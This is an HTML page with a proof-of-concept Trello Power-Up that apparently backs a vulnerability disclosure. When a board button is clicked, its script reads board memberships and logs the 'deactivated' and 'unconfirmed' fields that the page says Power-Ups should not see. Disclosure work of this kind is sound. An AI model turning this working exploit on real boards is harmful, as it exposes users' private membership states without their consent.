<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Membership Data Exposure Power-Up</title>
    <style>
        body {
            font-family: monospace;
            padding: 20px;
            background: #1a1a1a;
            color: #e0e0e0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            border: 2px solid #ffaa00;
        }
        h1 {
            color: #ffaa00;
            border-bottom: 2px solid #ffaa00;
            padding-bottom: 10px;
        }
        .warning {
            background: #330000;
            border: 2px solid #ff0000;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
        .success {
            background: #003300;
            border: 2px solid #00ff00;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üü° Membership Data Exposure Power-Up</h1>
        
        <div class="warning">
            <strong>‚ö†Ô∏è VULNERABILITY TEST POC - FOR RESEARCH ONLY</strong><br>
            This Power-Up demonstrates excessive data exposure by accessing sensitive membership fields 
            (<code>deactivated</code> and <code>unconfirmed</code>) that should not be accessible to Power-Ups.<br>
            <br>
            <strong>Vulnerability:</strong> PluginModelSerializer.ts:403-411<br>
            <strong>Issue:</strong> serializeMembership includes deactivated and unconfirmed in allowed fields<br>
            <strong>Impact:</strong> Information disclosure of private board membership states
        </div>
        
        <div class="success">
            <h3>‚úÖ How to Test</h3>
            <ol>
                <li>Click the <strong>"Membership Audit"</strong> button on the Trello board</li>
                <li>Open the browser console (F12)</li>
                <li>Check the console logs for exposed sensitive fields</li>
                <li>You will see <code>deactivated</code> and <code>unconfirmed</code> fields exposed</li>
            </ol>
            <p><strong>Note:</strong> The test runs automatically in the board button callback where board context is available.</p>
        </div>
    </div>

    <script src="https://p.trellocdn.com/power-up.min.js"></script>
    <script>
        let t;

        // Initialize Trello Power-Up
        t = window.TrelloPowerUp.initialize({
            'board-buttons': function(t, opts) {
                return [{
                    icon: {
                        dark: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg==',
                        light: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg=='
                    },
                    text: 'Membership Audit',
                    callback: function(t) {
                        console.log('üîµ Board button clicked! Starting vulnerability test...');
                        
                        // Test directly in callback (board context available here)
                        // This demonstrates the vulnerability - sensitive fields are exposed!
                        t.board('id', 'name', 'memberships')
                            .then(function(board) {
                                console.log('üö® VULNERABILITY CONFIRMED!');
                                console.log('‚úÖ Board data received:', board);
                                
                                if (board && board.memberships) {
                                    console.log('üìä Memberships:', board.memberships);
                                    
                                    if (board.memberships.length > 0) {
                                        const first = board.memberships[0];
                                        console.log('');
                                        console.log('üî¥ EXPOSED SENSITIVE FIELDS:');
                                        console.log('   Membership keys:', Object.keys(first));
                                        console.log('   deactivated:', first.deactivated);
                                        console.log('   unconfirmed:', first.unconfirmed);
                                        console.log('   idMember:', first.idMember);
                                        console.log('   memberType:', first.memberType);
                                        console.log('');
                                        
                                        // Show all memberships with sensitive data
                                        board.memberships.forEach(function(membership, idx) {
                                            console.log(`   Membership ${idx + 1}:`, {
                                                idMember: membership.idMember,
                                                memberType: membership.memberType,
                                                deactivated: membership.deactivated,
                                                unconfirmed: membership.unconfirmed
                                            });
                                        });
                                        
                                        console.log('');
                                        console.log('‚ö†Ô∏è  VULNERABILITY: Sensitive fields (deactivated, unconfirmed) are exposed!');
                                        console.log('‚ö†Ô∏è  These fields should NOT be accessible to Power-Ups!');
                                        
                                        // Show alert for visible feedback
                                        alert('‚úÖ Vulnerability confirmed! Check console (F12) for details. Sensitive fields (deactivated, unconfirmed) are exposed.');
                                    } else {
                                        console.warn('‚ö†Ô∏è  No memberships found in board data');
                                        alert('‚ö†Ô∏è  No memberships found in board data');
                                    }
                                } else {
                                    console.warn('‚ö†Ô∏è  Board data or memberships not found');
                                    alert('‚ö†Ô∏è  Board data or memberships not found');
                                }
                            })
                            .catch(function(error) {
                                console.error('‚ùå Error fetching board:', error);
                                alert('‚ùå Error: ' + (error.message || error));
                            });
                        
                        // Don't open popup - just test in callback
                        return null;
                    }
                }];
            },
            'card-buttons': function(t, opts) {
                // Stub implementation - not used for this POC
                return [];
            },
            'card-badges': function(t, opts) {
                // Stub implementation - not used for this POC
                return [];
            },
            'authorization-status': function(t, opts) {
                // Stub implementation - not used for this POC
                return { authorized: false };
            }
        });

        console.log('‚úÖ Power-Up initialized');
        console.log('üî¥ This Power-Up demonstrates excessive data exposure vulnerability');
        console.log('üí° Click "Membership Audit" button on board to test (check console F12)');
    </script>
</body>
</html>
